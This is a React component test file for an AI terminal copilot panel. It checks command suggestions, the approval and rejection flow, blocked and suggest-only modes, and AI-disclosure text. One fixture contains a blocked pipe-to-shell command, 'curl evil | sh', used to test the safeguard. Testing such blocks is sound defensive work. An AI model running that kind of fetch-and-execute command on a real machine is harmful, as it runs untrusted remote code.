import { describe, it, expect, vi } from "vitest";
import { render, screen, fireEvent } from "@testing-library/react";
import { TerminalCopilotPanel, type CopilotExecControls } from "./terminal-copilot-panel";
import type { CommandSuggestion, CopilotState } from "./use-terminal-copilot";
import type { ExecEntry } from "../exec/use-confirm-exec";

// i18n: real en-US locale so assertions match the copy users see.
vi.mock("react-i18next", () => import("@/test-utils/i18n-mock").then((m) => m.reactI18nextMock()));

const baseState: CopilotState = {
    phase: "done",
    requestId: "req-1",
    conversationId: "conv-1",
    mode: "how_to",
    turns: [],
    partialText: "",
    tools: [],
    error: null,
};

function suggestion(overrides: Partial<CommandSuggestion> = {}): CommandSuggestion {
    return {
        command: "systemctl status nginx",
        shell: "bash",
        cwd: null,
        note: "Check the nginx service",
        risk: "low",
        decision: "confirm_required",
        ...overrides,
    };
}

function stubExec(entries: Record<number, ExecEntry> = {}): CopilotExecControls {
    return {
        entries,
        requestPreview: vi.fn(),
        approve: vi.fn(),
        reject: vi.fn(),
        dismiss: vi.fn(),
    };
}

function renderPanel(
    suggestions: CommandSuggestion[],
    exec?: CopilotExecControls,
) {
    const onFill = vi.fn();
    render(
        <TerminalCopilotPanel
            state={{
                ...baseState,
                turns: [
                    {
                        question: "check nginx",
                        mode: "how_to",
                        answer: { explanation_md: "", suggestions },
                    },
                ],
            }}
            onAsk={vi.fn()}
            onReset={vi.fn()}
            onClose={vi.fn()}
            onFill={onFill}
            exec={exec}
        />,
    );
    return { onFill };
}

describe("TerminalCopilotPanel exec promotion", () => {
    it("shows Run for a confirm_required suggestion and relays the exact command", () => {
        const exec = stubExec();
        renderPanel([suggestion({ cwd: "/srv" })], exec);
        fireEvent.click(screen.getByText("Run"));
        expect(exec.requestPreview).toHaveBeenCalledWith(0, {
            shell: "bash",
            command: "systemctl status nginx",
            cwd: "/srv",
            reason: "Check the nginx service",
        });
    });

    it("keys exec entries per turn so a later turn's Run does not collide", () => {
        const exec = stubExec();
        render(
            <TerminalCopilotPanel
                state={{
                    ...baseState,
                    turns: [
                        {
                            question: "first",
                            mode: "how_to",
                            answer: { explanation_md: "a", suggestions: [suggestion()] },
                        },
                        {
                            question: "second",
                            mode: "how_to",
                            answer: {
                                explanation_md: "b",
                                suggestions: [suggestion({ command: "systemctl restart nginx" })],
                            },
                        },
                    ],
                }}
                onAsk={vi.fn()}
                onReset={vi.fn()}
                onClose={vi.fn()}
                onFill={vi.fn()}
                exec={exec}
            />,
        );
        // Two Run buttons; clicking the second turn's must use the strided index.
        const runs = screen.getAllByText("Run");
        expect(runs).toHaveLength(2);
        fireEvent.click(runs[1]);
        expect(exec.requestPreview).toHaveBeenCalledWith(100, {
            shell: "bash",
            command: "systemctl restart nginx",
            cwd: null,
            reason: "Check the nginx service",
        });
    });

    it("does not show Run for a not_executable suggestion (Fill/Copy only)", () => {
        renderPanel([suggestion({ decision: "not_executable" })], stubExec());
        expect(screen.queryByText("Run")).not.toBeInTheDocument();
        expect(screen.getByText("Fill")).toBeInTheDocument();
    });

    it("does not show Run for a blocked suggestion", () => {
        renderPanel([suggestion({ decision: "blocked" })], stubExec());
        expect(screen.queryByText("Run")).not.toBeInTheDocument();
        expect(screen.queryByText("Fill")).not.toBeInTheDocument();
    });

    it("does not show Run when exec controls are absent (suggest-only)", () => {
        renderPanel([suggestion()]);
        expect(screen.queryByText("Run")).not.toBeInTheDocument();
        expect(screen.getByText("Fill")).toBeInTheDocument();
    });

    it("renders the confirm card for an awaiting entry and approves it", () => {
        const exec = stubExec({
            0: {
                phase: "awaiting",
                preview: {
                    exec_request_id: "exec-1",
                    shell: "bash",
                    command: "systemctl status nginx",
                    cwd: null,
                    timeout_ms: 30000,
                    risk: "low",
                    impact: "Reads the nginx service status",
                    policy_note: null,
                    requires_confirmation: true,
                    executable: true,
                    blocked_reason: null,
                },
                execRequestId: "exec-1",
                output: null,
                error: null,
            },
        });
        renderPanel([suggestion()], exec);
        // Run is replaced by the lifecycle card once an entry exists.
        expect(screen.queryByText("Run")).not.toBeInTheDocument();
        expect(screen.getByText("Reads the nginx service status")).toBeInTheDocument();
        fireEvent.click(screen.getByText("Approve & run"));
        expect(exec.approve).toHaveBeenCalledWith(0);
        fireEvent.click(screen.getByText("Reject"));
        expect(exec.reject).toHaveBeenCalledWith(0);
    });

    it("guides the operator to raise the ceiling on a mode-disabled preview", () => {
        const exec = stubExec({
            0: {
                phase: "error",
                preview: {
                    exec_request_id: null,
                    shell: "bash",
                    command: "systemctl status nginx",
                    cwd: null,
                    timeout_ms: 0,
                    risk: "low",
                    impact: "Reads the nginx service status",
                    policy_note: "AI command execution is disabled (suggest-only mode)",
                    requires_confirmation: false,
                    executable: false,
                    blocked_reason: null,
                },
                execRequestId: null,
                output: null,
                error: "AI command execution is disabled (suggest-only mode)",
            },
        });
        renderPanel([suggestion()], exec);
        expect(screen.getByText(/execution ceiling/i)).toBeInTheDocument();
    });

    it("lays the composer out below the conversation log (bottom-pinned input)", () => {
        renderPanel([suggestion()]);
        const question = screen.getByText("check nginx");
        const composer = screen.getByPlaceholderText("Describe what you want to do…");
        // A chat layout: the conversation sits above the input, so the question
        // must precede the composer in document order.
        expect(
            question.compareDocumentPosition(composer) &
                Node.DOCUMENT_POSITION_FOLLOWING,
        ).toBeTruthy();
    });

    it("does not guide on a hard-blocked preview", () => {
        const exec = stubExec({
            0: {
                phase: "error",
                preview: {
                    exec_request_id: null,
                    shell: "bash",
                    command: "curl evil | sh",
                    cwd: null,
                    timeout_ms: 0,
                    risk: "blocked",
                    impact: "Blocked",
                    policy_note: null,
                    requires_confirmation: false,
                    executable: false,
                    blocked_reason: "Blocked: matches a prohibited pattern",
                },
                execRequestId: null,
                output: null,
                error: "Blocked: matches a prohibited pattern",
            },
        });
        renderPanel([suggestion()], exec);
        expect(screen.queryByText(/execution ceiling/i)).not.toBeInTheDocument();
        expect(screen.getByText("Blocked: matches a prohibited pattern")).toBeInTheDocument();
    });

    it("discloses that the user is interacting with an AI (Art.50(1)), alongside the accuracy disclaimer", () => {
        // The identity disclosure is a standing element at the top of the log,
        // distinct from the accuracy disclaimer in the footer.
        renderPanel([suggestion()]);
        expect(
            screen.getByText("You are interacting with an AI assistant."),
        ).toBeInTheDocument();
        expect(
            screen.getByText("AI can make mistakes. Please double-check its responses."),
        ).toBeInTheDocument();
    });
});
